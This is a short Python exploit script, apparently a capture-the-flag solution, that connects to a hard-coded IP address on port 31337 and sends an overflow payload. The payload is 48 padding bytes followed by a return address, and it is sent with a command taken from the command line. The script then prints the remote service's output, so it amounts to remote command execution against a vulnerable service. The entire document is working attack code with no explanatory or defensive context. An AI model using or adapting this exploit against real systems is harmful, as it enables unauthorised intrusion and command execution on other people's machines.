import socket
import sys

ADDRESS = "89.38.210.128"
PORT = 31337
S_NUM = b"31337"
P_MESS = b"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLL\x60\x86\x04\x08"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ADDRESS, PORT))


command = b" ".join(sys.argv[1:])
s.sendall(b"{}\n{}\n{}\n".format(S_NUM, P_MESS, command))
s.shutdown(socket.SHUT_WR)
while True:
    data = s.recv(4096)
    if not data:
        break
    for line in data.split("\n"):
        if "Call>" in line:
            continue
        if "Leave a message for the principal, please:" in line:
            continue
        if "Principal got your message " in line:
            continue
        print(line)
s.close()
